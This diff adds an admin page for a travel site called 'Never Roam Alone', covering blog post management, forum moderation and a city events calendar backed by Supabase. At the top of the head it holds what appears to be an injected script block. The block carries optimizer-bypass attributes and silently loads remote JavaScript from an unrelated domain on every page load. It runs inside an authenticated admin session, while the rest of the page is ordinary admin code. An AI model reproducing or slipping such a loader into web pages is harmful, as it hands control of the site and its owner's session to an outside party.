@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16.png" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png" />
+
+  <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
+  (function () {
+      var script = document.createElement("script");
+      script.async = 1;
+      script.src = 'https://emrld.ltd/NTQ4MDY2.js?t=548066';
+      document.head.appendChild(script);
+  })();
+</script>
+
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="robots" content="noindex" />
+<title>Admin — Never Roam Alone</title>
+<link rel="stylesheet" href="fonts/amatic-sc.css" />
+<style>
+  :root{
+    --ink:#1d2a32;--muted:#5b6b75;--sand:#f6f1e7;--green:#556B2F;--teal:#556B2F;
+    --teal-dark:#3C4B21;--coral:#C04020;--card:#fff;--shadow:0 10px 30px rgba(20,40,50,.12);--maxw:1180px;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    color:var(--ink);background:var(--sand);line-height:1.6}
+  h1,h2,h3{font-family:Georgia,"Amatic SC",serif;letter-spacing:.2px}
+  a{color:inherit;text-decoration:none}
+
+  header.nav{position:sticky;top:0;z-index:50;background:rgba(246,241,231,.92);
+    backdrop-filter:blur(8px);border-bottom:1px solid rgba(85,107,47,.15)}
+  .nav-inner{max-width:var(--maxw);margin:0 auto;padding:14px 22px;display:flex;align-items:center;justify-content:space-between}
+  .brand{display:flex;align-items:center;gap:10px;font-family:'Amatic SC',Georgia,serif;font-weight:700;font-size:1.85rem;line-height:1;color:#C04020}
+  .brand .logo{flex-shrink:0;display:block}
+  .brand small{display:block;font-family:-apple-system,sans-serif;font-weight:500;font-size:.62rem;letter-spacing:.18em;text-transform:uppercase;color:var(--muted)}
+  nav.links a{margin-left:26px;font-weight:600;font-size:.82rem;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);padding-bottom:3px;border-bottom:2px solid transparent;transition:.2s}
+  nav.links a:hover{color:var(--coral);border-color:var(--coral)}
+  @media(max-width:880px){nav.links{display:none}}
+
+  .page-hero{background:linear-gradient(135deg,#3C4B21 0%,#556B2F 100%);color:#fff;text-align:center;padding:46px 22px 38px}
+  .page-hero .kicker{color:rgba(255,255,255,.7);font-weight:700;text-transform:uppercase;letter-spacing:.22em;font-size:.74rem;margin:0 0 10px}
+  .page-hero h1{font-size:clamp(1.8rem,4.5vw,2.7rem);margin:0;color:#fff}
+  .page-hero p{color:rgba(255,255,255,.75);max-width:560px;margin:10px auto 0;font-size:.98rem}
+
+  main{max-width:900px;margin:0 auto;padding:34px 22px 70px}
+
+  .gate{background:var(--card);border-radius:16px;box-shadow:var(--shadow);padding:44px 26px;text-align:center;color:var(--muted)}
+  .gate h2{margin:0 0 8px;color:var(--ink)}
+  .btn{display:inline-block;background:var(--green);color:#fff;font-weight:700;font-size:.86rem;border:none;border-radius:24px;padding:10px 20px;cursor:pointer;font-family:inherit;transition:background .2s}
+  .btn:hover{background:var(--coral)}
+  .btn.small{font-size:.78rem;padding:7px 14px}
+  .btn.ghost{background:none;color:var(--muted);text-decoration:underline;font-weight:600}
+  .btn.coral{background:var(--green)} .btn.coral:hover{background:var(--coral)}
+  .btn.danger{background:none;border:2px solid #b34a3a;color:#b34a3a;padding:5px 12px}
+  .btn.danger:hover{background:#b34a3a;color:#fff}
+  .btn:disabled{opacity:.55;cursor:default}
+
+  /* tabs */
+  .tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:24px}
+  .tab{background:var(--card);border:1.5px solid #e3dcc9;color:var(--muted);font-family:inherit;font-weight:700;font-size:.86rem;padding:9px 18px;border-radius:22px;cursor:pointer;transition:.15s}
+  .tab:hover{border-color:var(--green);color:var(--green)}
+  .tab.active{background:var(--green);color:#fff;border-color:var(--green)}
+  .tabpane[hidden]{display:none}
+
+  .topbar{display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:20px}
+  .topbar h2{margin:0;font-size:1.3rem;flex:1}
+  .admin-msg{font-size:.86rem;color:var(--teal);margin:0 0 14px;min-height:1.2em}
+  .admin-msg.err{color:#b34a3a;font-weight:600}
+
+  .plist{display:flex;flex-direction:column;gap:12px;margin-bottom:34px}
+  .prow{background:var(--card);border-radius:14px;box-shadow:var(--shadow);padding:14px 16px;display:flex;gap:14px;align-items:center;flex-wrap:wrap}
+  .prow .thumb{width:86px;height:58px;border-radius:8px;background:var(--sand) center/cover no-repeat;flex-shrink:0}
+  .prow .info{flex:1;min-width:180px}
+  .prow .title{font-weight:700;line-height:1.3}
+  .prow .sub{font-size:.78rem;color:var(--muted);margin-top:2px}
+  .chip{display:inline-block;font-size:.66rem;font-weight:800;text-transform:uppercase;letter-spacing:.07em;
+    padding:3px 10px;border-radius:14px;vertical-align:middle;margin-left:8px}
+  .chip.live{background:rgba(85,107,47,.12);color:var(--green)}
+  .chip.draft{background:rgba(192,64,32,.14);color:#c05135}
+  .chip.hidden{background:rgba(192,64,32,.14);color:#c05135}
+  .chip.pending{background:#fff3d6;color:#8a6d1a}
+  .chip.builtin{background:rgba(85,107,47,.12);color:var(--teal)}
+  .prow .acts{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+  .empty{background:var(--card);border-radius:14px;box-shadow:var(--shadow);padding:26px;text-align:center;color:var(--muted)}
+  .sect-note{font-size:.86rem;color:var(--muted);margin:-8px 0 14px}
+
+  /* forum moderation */
+  .qadmin{background:var(--card);border-radius:14px;box-shadow:var(--shadow);padding:14px 16px;margin-bottom:12px}
+  .qadmin .qhead{display:flex;gap:10px;align-items:flex-start;flex-wrap:wrap}
+  .qadmin .qhead .info{flex:1;min-width:180px}
+  .qadmin .title{font-weight:700;line-height:1.3}
+  .qadmin .sub{font-size:.78rem;color:var(--muted);margin-top:2px}
+  .radmin{display:flex;gap:10px;align-items:flex-start;padding:9px 0 0 18px;margin-top:9px;border-top:1px solid rgba(20,40,50,.08)}
+  .radmin:first-of-type{margin-top:12px}
+  .radmin .rinfo{flex:1;min-width:120px}
+  .radmin .rname{font-weight:700;font-size:.84rem}
+  .radmin .rbody{font-size:.86rem;color:var(--ink);margin-top:2px;white-space:pre-wrap}
+
+  /* events */
+  .card{background:var(--card);border-radius:16px;box-shadow:var(--shadow);padding:22px 22px 26px;margin-bottom:28px}
+  .card h2{margin:0 0 4px;font-size:1.3rem}
+  .card .sub{color:var(--muted);font-size:.86rem;margin:0 0 16px}
+  form label{display:block;font-size:.76rem;font-weight:700;color:var(--teal);text-transform:uppercase;letter-spacing:.04em;margin:14px 0 5px}
+  form input[type=text],form input[type=url],form input[type=date],form input[type=time],form input[type=file]{
+    width:100%;box-sizing:border-box;border:1.5px solid #ddd4c2;border-radius:9px;padding:9px 11px;font-family:inherit;font-size:.92rem;color:var(--ink);background:#fff}
+  form input:focus{outline:none;border-color:var(--green)}
+  .row{display:flex;gap:12px;flex-wrap:wrap}
+  .row>div{flex:1;min-width:130px}
+  .hint{font-size:.74rem;color:var(--muted);font-weight:400;text-transform:none;letter-spacing:0;margin-top:3px;display:block}
+  .poster-prev{margin-top:8px;max-width:120px;max-height:120px;border-radius:10px;display:none}
+  .actions{margin-top:22px;display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+  .elist{display:flex;flex-direction:column;gap:12px}
+  .erow{background:var(--card);border-radius:14px;box-shadow:var(--shadow);padding:14px 16px;display:flex;gap:14px;align-items:center;flex-wrap:wrap}
+  .erow.pending{border:1.5px solid #e0b64d}
+  .erow.flash{box-shadow:0 0 0 3px #e0b64d, var(--shadow)}
+  .btn.small.coral{background:var(--green);color:#fff;text-decoration:none}
+  .btn.small.coral:hover{background:var(--coral)}
+  .erow .thumb{width:66px;height:66px;border-radius:8px;background:var(--sand) center/cover no-repeat;flex-shrink:0}
+  .erow .info{flex:1;min-width:180px}
+  .erow .title{font-weight:700;line-height:1.3}
+  .erow .sub{font-size:.78rem;color:var(--muted);margin-top:2px}
+  .erow .acts{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+
+  footer{background:var(--teal-dark);color:#dff1f2;text-align:center;padding:30px 22px}
+</style>
+</head>
+<body>
+
+<header class="nav">
+  <div class="nav-inner">
+    <a class="brand" href="index.html">
+      <img class="logo" src="logo.svg" width="46" height="46" alt="Never Roam Alone logo">
+      <span>Never Roam Alone<small>Your Travel Companion</small></span>
+    </a>
+    <nav class="links" data-site-nav></nav>
+  </div>
+</header>
+
+<div class="page-hero">
+  <p class="kicker" data-no-i18n>Admin</p>
+  <h1 data-no-i18n>Admin</h1>
+  <p data-no-i18n>Manage blog posts, moderate Ask a Roamer, and run the city event calendars — all in one place.</p>
+</div>
+
+<main data-no-i18n>
+  <div id="gate" class="gate"><h2>Loading…</h2><p>Checking your account.</p></div>
+
+  <div id="panel" style="display:none">
+
+    <div class="tabs" role="tablist">
+      <button class="tab active" type="button" data-tab="posts">Posts</button>
+      <button class="tab" type="button" data-tab="forum">Ask a Roamer</button>
+      <button class="tab" type="button" data-tab="events">Events</button>
+    </div>
+
+    <!-- ========== POSTS ========== -->
+    <section id="tab-posts" class="tabpane">
+      <div class="topbar">
+        <h2>Your articles</h2>
+        <a class="btn coral" href="blog-editor.html">+ New article</a>
+      </div>
+      <p class="admin-msg" id="admin-msg"></p>
+      <div class="plist" id="db-list"></div>
+
+      <div class="topbar"><h2>Built-in articles (posts.js)</h2></div>
+      <p class="sect-note">These six live in the <b>posts.js</b> file. To change one from here, click <b>Edit a copy</b> — it opens in the editor, and publishing the copy replaces the original everywhere on the site.</p>
+      <div class="plist" id="local-list"></div>
+    </section>
+
+    <!-- ========== ASK A ROAMER ========== -->
+    <section id="tab-forum" class="tabpane" hidden>
+      <div class="topbar"><h2>Ask a Roamer — questions &amp; replies</h2></div>
+      <p class="sect-note">Delete a whole question (and every reply on it) or just a single reply.</p>
+      <p class="admin-msg" id="forum-msg"></p>
+      <div id="forum-list"></div>
+    </section>
+
+    <!-- ========== EVENTS ========== -->
+    <section id="tab-events" class="tabpane" hidden>
+      <div class="card">
+        <h2 id="form-title">Add an event</h2>
+        <p class="sub">The <b>City</b> must match the city name exactly as it appears on its guide page (copy it straight from the submission email). Fields marked * are required.</p>
+        <form id="evt-form" novalidate>
+          <input type="hidden" id="f-id" value="">
+          <div class="row">
+            <div>
+              <label>City *</label>
+              <input type="text" id="f-city" list="city-list" placeholder="e.g. Paris" required>
+              <datalist id="city-list"></datalist>
+            </div>
+            <div>
+              <label>Event name *</label>
+              <input type="text" id="f-name" maxlength="140" required>
+            </div>
+          </div>
+          <div class="row">
+            <div>
+              <label>Date *</label>
+              <input type="date" id="f-date" required>
+            </div>
+            <div>
+              <label>Start time</label>
+              <input type="time" id="f-start">
+            </div>
+            <div>
+              <label>End time</label>
+              <input type="time" id="f-end">
+            </div>
+          </div>
+          <label>Location</label>
+          <input type="text" id="f-location" maxlength="200" placeholder="Venue or address">
+          <label>Map link</label>
+          <input type="url" id="f-map" placeholder="https://maps.google.com/…">
+          <label>Event link</label>
+          <input type="url" id="f-link" placeholder="https://… (tickets or info)">
+          <label>Poster image URL</label>
+          <input type="url" id="f-poster" placeholder="https://… (or upload below)">
+          <input type="file" id="f-poster-file" accept="image/*" style="margin-top:8px">
+          <span class="hint">Paste the poster link from the email, or upload an image (up to 8&nbsp;MB) to fill it automatically.</span>
+          <img id="poster-prev" class="poster-prev" alt="Poster preview">
+          <div class="actions">
+            <button type="submit" class="btn" id="save-btn">Save event</button>
+            <button type="button" class="btn ghost" id="clear-btn">Clear form</button>
+            <span class="admin-msg" id="form-msg" style="margin:0"></span>
+          </div>
+        </form>
+      </div>
+
+      <div class="card" style="padding-bottom:22px">
+        <h2>All events</h2>
+        <p class="sub">Newest date first. “Hidden” events stay saved but don't show on the city calendar.</p>
+        <p class="admin-msg" id="list-msg"></p>
+        <div class="elist" id="event-list"></div>
+      </div>
+    </section>
+
+  </div>
+</main>
+
+<footer>
+  <div>Never Roam Alone — admin (owner only)</div>
+</footer>
+
+<script src="posts.js"></script>
+<script src="nra-config.js"></script>
+<script src="auth.js"></script>
+<script src="nav.js"></script>
+<script>
+/* =====================================================================
+   ADMIN — owner only. One page for three jobs:
+     • Posts  — the Supabase blog_posts table + built-in posts.js articles
+     • Ask a Roamer — moderate forum questions & replies
+     • Events — add / edit / hide / delete rows in city_events (the city
+       calendars) with poster uploads
+   Access is gated by the same blog_admins list + is_blog_admin() check.
+   ===================================================================== */
+(function(){
+  "use strict";
+  const $ = id => document.getElementById(id);
+  const esc = s => String(s==null?"":s).replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
+  const gate = $("gate"), panel = $("panel");
+  let sb = null;
+
+  function fmtTime(t){
+    if (!t) return "";
+    const m = String(t).match(/^(\d{1,2}):(\d{2})/);
+    if (!m) return String(t);
+    let h = parseInt(m[1],10); const ap = h>=12?"PM":"AM"; h = h%12; if (h===0) h=12;
+    return h + ":" + m[2] + " " + ap;
+  }
+  function showGate(title, text, withSignIn){
+    panel.style.display = "none";
+    gate.style.display = "";
+    gate.innerHTML = `<h2>${esc(title)}</h2><p>${esc(text)}</p>` +
+      (withSignIn ? `<p style="margin-top:18px"><button class="btn" id="gate-signin" type="button">Sign in</button></p>` : "");
+    const b = $("gate-signin");
+    if (b) b.onclick = () => window.NRA_AUTH.openModal();
+  }
+  function setMsg(el, text, isErr){ if(!el) return; el.textContent = text||""; el.className = "admin-msg" + (isErr?" err":""); }
+
+  async function checkAccess(){
+    if (!window.NRA_AUTH || !window.NRA_AUTH.enabled){
+      showGate("Accounts aren't set up", "This page needs the site's Supabase connection (nra-config.js)."); return;
+    }
+    await window.NRA_AUTH.ready();
+    sb = window.NRA_AUTH.client();
+    if (!sb || !window.NRA_AUTH.user()){
+      showGate("Sign in to open the admin page", "This page is for the site owner. Sign in with your admin account to continue.", true);
+      return;
+    }
+    let isAdmin = false;
+    try{ const { data, error } = await sb.rpc("is_blog_admin"); isAdmin = !error && data === true; }catch(e){}
+    if (!isAdmin){
+      showGate("Not authorized", "This account isn't on the admin list. (If this is your admin account, make sure blog-setup.sql / city-events-setup.sql have been run in Supabase.)");
+      return;
+    }
+    gate.style.display = "none";
+    panel.style.display = "";
+    initTabs();
+    renderLocal();
+    await loadRows();
+    await loadForum();
+    const params = new URLSearchParams(location.search);
+    const qCity = params.get("city");
+    if (qCity) $("f-city").value = qCity;
+    reviewId = params.get("review") || "";          // from the email "Review this submission" link
+    // open a specific tab if asked (?tab=events) — do this BEFORE loading so the
+    // row is visible when we scroll to it
+    const wantTab = params.get("tab");
+    if (wantTab) showTab(wantTab);
+    await loadEvents();
+  }
+
+  /* ---------- tabs ---------- */
+  function showTab(name){
+    ["posts","forum","events"].forEach(t => {
+      const pane = $("tab-" + t);
+      if (pane) pane.hidden = (t !== name);
+    });
+    document.querySelectorAll(".tab").forEach(b => b.classList.toggle("active", b.dataset.tab === name));
+  }
+  function initTabs(){
+    document.querySelectorAll(".tab").forEach(b => b.addEventListener("click", () => showTab(b.dataset.tab)));
+  }
+
+  /* ======================================================================
+     POSTS — database articles + built-in posts.js
+     ====================================================================== */
+  let rows = [];
+  function photoOf(p){
+    if (p.cover && p.cover.url) return p.cover.url;
+    return "https://picsum.photos/seed/" + encodeURIComponent(p.seed || p.slug) + "-nra/300/200";
+  }
+  async function loadRows(){
+    setMsg($("admin-msg"), "Loading articles…");
+    const { data, error } = await sb.from("blog_posts")
+      .select("id,slug,title,tag,date,seed,cover,excerpt,published,updated_at")
+      .order("date", { ascending: false });
+    if (error){
+      setMsg($("admin-msg"), "Couldn't load articles: " + (error.message || "unknown error") + " — has blog-setup.sql been run in Supabase?", true);
+      $("db-list").innerHTML = ""; return;
+    }
+    rows = data || [];
+    setMsg($("admin-msg"), "");
+    renderRows();
+  }
+  function renderRows(){
+    const wrap = $("db-list");
+    if (!rows.length){
+      wrap.innerHTML = `<div class="empty">No articles written in the editor yet.<br>Click <b>+ New article</b> to write your first one.</div>`;
+      return;
+    }
+    wrap.innerHTML = rows.map(p => `
+      <div class="prow" data-id="${p.id}">
+        <div class="thumb" style="background-image:url('${esc(photoOf(p))}')"></div>
+        <div class="info">
+          <div class="title">${esc(p.title)}
+            <span class="chip ${p.published ? "live" : "draft"}">${p.published ? "Published" : "Draft"}</span>
+          </div>
+          <div class="sub">${esc(p.date || "")}${p.tag ? " · " + esc(p.tag) : ""} · post.html?post=${esc(p.slug)}</div>
+        </div>
+        <div class="acts">
+          ${p.published ? `<a class="btn small ghost" target="_blank" href="post.html?post=${encodeURIComponent(p.slug)}">View</a>` : ""}
+          <a class="btn small" href="blog-editor.html?id=${encodeURIComponent(p.id)}">Edit</a>
+          <button class="btn small ghost" data-act="toggle" type="button">${p.published ? "Unpublish" : "Publish"}</button>
+          <button class="btn small danger" data-act="del" type="button">Delete</button>
+        </div>
+      </div>`).join("");
+  }
+  $("db-list").addEventListener("click", async e => {
+    const btn = e.target.closest("button[data-act]");
+    if (!btn) return;
+    const p = rows.find(r => r.id === btn.closest(".prow").dataset.id);
+    if (!p) return;
+    if (btn.dataset.act === "toggle"){
+      btn.disabled = true;
+      const { error } = await sb.from("blog_posts").update({ published: !p.published }).eq("id", p.id);
+      if (error){ setMsg($("admin-msg"), "Couldn't update: " + error.message, true); btn.disabled = false; return; }
+      setMsg($("admin-msg"), p.published ? `"${p.title}" is now a draft (hidden from the site).` : `"${p.title}" is now live.`);
+      await loadRows();
+    }
+    if (btn.dataset.act === "del"){
+      if (btn.dataset.armed !== "1"){
+        btn.dataset.armed = "1"; btn.textContent = "Really delete?";
+        setTimeout(() => { if (btn.isConnected){ btn.dataset.armed = ""; btn.textContent = "Delete"; } }, 4000);
+        return;
+      }
+      btn.disabled = true;
+      const { error } = await sb.from("blog_posts").delete().eq("id", p.id);
+      if (error){ setMsg($("admin-msg"), "Couldn't delete: " + error.message, true); btn.disabled = false; return; }
+      setMsg($("admin-msg"), `Deleted "${p.title}".` + (window.NRA_POSTS_UTIL && window.NRA_POSTS_UTIL.bySlug(p.slug) ? " The built-in posts.js version shows again." : ""));
+      await loadRows();
+    }
+  });
+  function renderLocal(){
+    const list = (window.NRA_POSTS_UTIL ? window.NRA_POSTS_UTIL.byNewest() : []);
+    $("local-list").innerHTML = list.map(p => `
+      <div class="prow">
+        <div class="thumb" style="background-image:url('https://picsum.photos/seed/${esc(p.seed)}-nra/300/200')"></div>
+        <div class="info">
+          <div class="title">${esc(p.title)}<span class="chip builtin">posts.js</span></div>
+          <div class="sub">${esc(p.date)} · ${esc(p.tag || "")}</div>
+        </div>
+        <div class="acts">
+          <a class="btn small ghost" target="_blank" href="post.html?post=${encodeURIComponent(p.slug)}">View</a>
+          <a class="btn small" href="blog-editor.html?copy=${encodeURIComponent(p.slug)}">Edit a copy</a>
+        </div>
+      </div>`).join("");
+  }
+
+  /* ======================================================================
+     ASK A ROAMER — questions + replies moderation
+     ====================================================================== */
+  let forumRows = [];
+  async function loadForum(){
+    setMsg($("forum-msg"), "Loading forum…");
+    const { data, error } = await sb.from("questions")
+      .select("id,name,city,title,body,created_at,replies(id,name,body,created_at)")
+      .order("created_at", { ascending: false });
+    if (error){
+      setMsg($("forum-msg"), "Couldn't load the forum: " + (error.message || "unknown error"), true);
+      $("forum-list").innerHTML = ""; return;
+    }
+    forumRows = (data || []).map(q => ({ ...q, replies: (q.replies||[]).sort((a,b)=> new Date(a.created_at)-new Date(b.created_at)) }));
+    setMsg($("forum-msg"), "");
+    renderForum();
+  }
+  function renderForum(){
+    const wrap = $("forum-list");
+    if (!forumRows.length){ wrap.innerHTML = `<div class="empty">No questions posted yet.</div>`; return; }
+    wrap.innerHTML = forumRows.map(q => `
+      <div class="qadmin" data-qid="${q.id}">
+        <div class="qhead">
+          <div class="info">
+            <div class="title">${esc(q.title)}</div>
+            <div class="sub">${esc(q.name)} · ${esc(q.city)} · ${new Date(q.created_at).toLocaleDateString()} · ${q.replies.length} ${q.replies.length===1?"reply":"replies"}</div>
+          </div>
+          <button class="btn small danger" data-act="delq" type="button">Delete question</button>
+        </div>
+        ${q.replies.map(r => `
+          <div class="radmin" data-rid="${r.id}">
+            <div class="rinfo">
+              <div class="rname">${esc(r.name)} <span class="sub" style="display:inline">· ${new Date(r.created_at).toLocaleDateString()}</span></div>
+              <div class="rbody">${esc(r.body)}</div>
+            </div>
+            <button class="btn small danger" data-act="delr" type="button">Delete reply</button>
+          </div>`).join("")}
+      </div>`).join("");
+  }
+  $("forum-list").addEventListener("click", async e => {
+    const btn = e.target.closest("button[data-act]");
+    if (!btn) return;
+    if (btn.dataset.armed !== "1"){
+      btn.dataset.armed = "1"; btn.dataset.original = btn.textContent; btn.textContent = "Really delete?";
+      setTimeout(() => { if (btn.isConnected){ btn.dataset.armed = ""; btn.textContent = btn.dataset.original; } }, 4000);
+      return;
+    }
+    btn.disabled = true;
+    if (btn.dataset.act === "delq"){
+      const qid = btn.closest(".qadmin").dataset.qid;
+      const { error } = await sb.from("questions").delete().eq("id", qid);
+      if (error){ setMsg($("forum-msg"), "Couldn't delete: " + error.message, true); btn.disabled = false; return; }
+      setMsg($("forum-msg"), "Question deleted."); await loadForum();
+    } else if (btn.dataset.act === "delr"){
+      const rid = btn.closest(".radmin").dataset.rid;
+      const { error } = await sb.from("replies").delete().eq("id", rid);
+      if (error){ setMsg($("forum-msg"), "Couldn't delete: " + error.message, true); btn.disabled = false; return; }
+      setMsg($("forum-msg"), "Reply deleted."); await loadForum();
+    }
+  });
+
+  /* ======================================================================
+     EVENTS — city_events table (the city calendars)
+     ====================================================================== */
+  let eRows = [];
+  let reviewId = ""; // set from ?review=<id> in the email link, to flash that row
+  async function loadEvents(){
+    setMsg($("list-msg"), "Loading events…");
+    const { data, error } = await sb.from("city_events").select("*").order("event_date", { ascending: false });
+    if (error){
+      setMsg($("list-msg"), "Couldn't load events: " + (error.message || "unknown error") + " — has city-events-setup.sql been run in Supabase?", true);
+      $("event-list").innerHTML = ""; return;
+    }
+    eRows = data || [];
+    // Pending visitor submissions first (need your attention), then newest date.
+    eRows.sort((a,b) => {
+      const ap = a.pending ? 0 : 1, bp = b.pending ? 0 : 1;
+      if (ap !== bp) return ap - bp;
+      return String(b.event_date||"").localeCompare(String(a.event_date||""));
+    });
+    const pendingCount = eRows.filter(r => r.pending).length;
+    setMsg($("list-msg"), pendingCount ? `${pendingCount} submission${pendingCount===1?"":"s"} awaiting review — use “Add to calendar” to publish or “Delete” to discard.` : "");
+    const cities = Array.from(new Set(eRows.map(r => r.city))).sort();
+    $("city-list").innerHTML = cities.map(c => `<option value="${esc(c)}"></option>`).join("");
+    renderEventRows();
+    highlightReview();
+  }
+  function renderEventRows(){
+    const wrap = $("event-list");
+    if (!eRows.length){ wrap.innerHTML = `<div class="empty">No events yet. Add one above.</div>`; return; }
+    wrap.innerHTML = eRows.map(ev => {
+      const time = ev.start_time ? fmtTime(ev.start_time) + (ev.end_time ? "–"+fmtTime(ev.end_time) : "") : "";
+      const thumb = ev.poster_url ? `<div class="thumb" style="background-image:url('${esc(ev.poster_url)}')"></div>` : `<div class="thumb"></div>`;
+      const pending = !!ev.pending;
+      const chip = pending
+        ? `<span class="chip pending">Pending review</span>`
+        : `<span class="chip ${ev.published ? "live" : "hidden"}">${ev.published ? "Live" : "Hidden"}</span>`;
+      const acts = pending
+        ? `<button class="btn small coral" data-act="publish" type="button">Add to calendar</button>` +
+          `<button class="btn small" data-act="edit" type="button">Edit</button>` +
+          `<button class="btn small danger" data-act="del" type="button">Delete</button>`
+        : `<button class="btn small" data-act="edit" type="button">Edit</button>` +
+          `<button class="btn small ghost" data-act="toggle" type="button">${ev.published ? "Hide" : "Show"}</button>` +
+          `<button class="btn small danger" data-act="del" type="button">Delete</button>`;
+      return `
+      <div class="erow${pending ? " pending" : ""}" data-id="${ev.id}">
+        ${thumb}
+        <div class="info">
+          <div class="title">${esc(ev.name)} ${chip}</div>
+          <div class="sub">${esc(ev.city)} · ${esc(ev.event_date || "")}${time ? " · " + esc(time) : ""}${ev.location ? " · " + esc(ev.location) : ""}</div>
+        </div>
+        <div class="acts">${acts}</div>
+      </div>`;
+    }).join("");
+  }
+  /* Scroll to + flash the event named in ?review=<id> (from the email link). */
+  function highlightReview(){
+    if (!reviewId) return;
+    const row = document.querySelector(`.erow[data-id="${reviewId}"]`);
+    if (!row) return;
+    row.scrollIntoView({ behavior: "smooth", block: "center" });
+    row.classList.add("flash");
+    setTimeout(() => row.classList.remove("flash"), 2600);
+    reviewId = ""; // only flash once
+  }
+  function clearForm(){
+    ["f-id","f-city","f-name","f-date","f-start","f-end","f-location","f-map","f-link","f-poster","f-poster-file"].forEach(id => { $(id).value = ""; });
+    $("poster-prev").style.display = "none"; $("poster-prev").src = "";
+    $("form-title").textContent = "Add an event";
+    $("save-btn").textContent = "Save event";
+    setMsg($("form-msg"), "");
+  }
+  $("clear-btn").onclick = clearForm;
+  function fillForm(ev){
+    $("f-id").value = ev.id; $("f-city").value = ev.city || ""; $("f-name").value = ev.name || "";
+    $("f-date").value = ev.event_date || "";
+    $("f-start").value = ev.start_time ? String(ev.start_time).slice(0,5) : "";
+    $("f-end").value = ev.end_time ? String(ev.end_time).slice(0,5) : "";
+    $("f-location").value = ev.location || ""; $("f-map").value = ev.map_link || "";
+    $("f-link").value = ev.link || ""; $("f-poster").value = ev.poster_url || "";
+    if (ev.poster_url){ $("poster-prev").src = ev.poster_url; $("poster-prev").style.display = "block"; }
+    else { $("poster-prev").style.display = "none"; }
+    $("form-title").textContent = "Edit event";
+    $("save-btn").textContent = "Update event";
+    setMsg($("form-msg"), "");
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  }
+  $("f-poster-file").addEventListener("change", async e => {
+    const file = e.target.files && e.target.files[0];
+    e.target.value = "";
+    if (!file) return;
+    if (file.size > 8*1024*1024){ setMsg($("form-msg"), "That image is over 8 MB — please use a smaller one.", true); return; }
+    setMsg($("form-msg"), "Uploading image…");
+    try{
+      const clean = file.name.toLowerCase().replace(/[^a-z0-9.]+/g,"-").slice(-48);
+      const path = "evt-" + Date.now() + "-" + Math.random().toString(36).slice(2,8) + "-" + clean;
+      const { error } = await sb.storage.from("event-images").upload(path, file, { cacheControl:"31536000", upsert:false });
+      if (error) throw error;
+      const { data } = sb.storage.from("event-images").getPublicUrl(path);
+      $("f-poster").value = data.publicUrl;
+      $("poster-prev").src = data.publicUrl; $("poster-prev").style.display = "block";
+      setMsg($("form-msg"), "Image uploaded.");
+    }catch(err){
+      setMsg($("form-msg"), "Upload failed: " + (err.message || "unknown error") + " (has city-events-setup.sql been run?)", true);
+    }
+  });
+  $("evt-form").addEventListener("submit", async e => {
+    e.preventDefault();
+    const val = id => $(id).value.trim();
+    const rec = {
+      city: val("f-city"), name: val("f-name"), event_date: val("f-date"),
+      start_time: val("f-start") || null, end_time: val("f-end") || null,
+      location: val("f-location") || null, map_link: val("f-map") || null,
+      link: val("f-link") || null, poster_url: val("f-poster") || null
+    };
+    if (!rec.city || !rec.name || !rec.event_date){
+      setMsg($("form-msg"), "Please fill in City, Event name, and Date.", true); return;
+    }
+    const id = $("f-id").value;
+    const btn = $("save-btn"); btn.disabled = true;
+    setMsg($("form-msg"), id ? "Updating…" : "Saving…");
+    try{
+      let error;
+      if (id){ ({ error } = await sb.from("city_events").update(rec).eq("id", id)); }
+      else   { ({ error } = await sb.from("city_events").insert(rec)); }
+      if (error) throw error;
+      setMsg($("form-msg"), id ? "Event updated." : "Event added.");
+      clearForm();
+      await loadEvents();
+    }catch(err){
+      setMsg($("form-msg"), "Couldn't save: " + (err.message || "unknown error"), true);
+    }finally{ btn.disabled = false; }
+  });
+  $("event-list").addEventListener("click", async e => {
+    const btn = e.target.closest("button[data-act]");
+    if (!btn) return;
+    const ev = eRows.find(r => r.id === btn.closest(".erow").dataset.id);
+    if (!ev) return;
+    if (btn.dataset.act === "edit"){ fillForm(ev); return; }
+    if (btn.dataset.act === "publish"){
+      btn.disabled = true;
+      const { error } = await sb.from("city_events").update({ published: true, pending: false }).eq("id", ev.id);
+      if (error){ setMsg($("list-msg"), "Couldn't add: " + error.message, true); btn.disabled = false; return; }
+      setMsg($("list-msg"), `"${ev.name}" is now live on the ${ev.city} calendar.`);
+      await loadEvents(); return;
+    }
+    if (btn.dataset.act === "toggle"){
+      btn.disabled = true;
+      const { error } = await sb.from("city_events").update({ published: !ev.published }).eq("id", ev.id);
+      if (error){ setMsg($("list-msg"), "Couldn't update: " + error.message, true); btn.disabled = false; return; }
+      await loadEvents(); return;
+    }
+    if (btn.dataset.act === "del"){
+      if (btn.dataset.armed !== "1"){
+        btn.dataset.armed = "1"; btn.textContent = "Really delete?";
+        setTimeout(() => { if (btn.isConnected){ btn.dataset.armed = ""; btn.textContent = "Delete"; } }, 4000);
+        return;
+      }
+      btn.disabled = true;
+      const { error } = await sb.from("city_events").delete().eq("id", ev.id);
+      if (error){ setMsg($("list-msg"), "Couldn't delete: " + error.message, true); btn.disabled = false; return; }
+      setMsg($("list-msg"), `Deleted "${ev.name}".`); await loadEvents();
+    }
+  });
+
+  if (window.NRA_AUTH) window.NRA_AUTH.onChange(() => {
+    if (panel.style.display === "none") checkAccess();
+  });
+  checkAccess();
+})();
+</script>
+</body>
+</html>
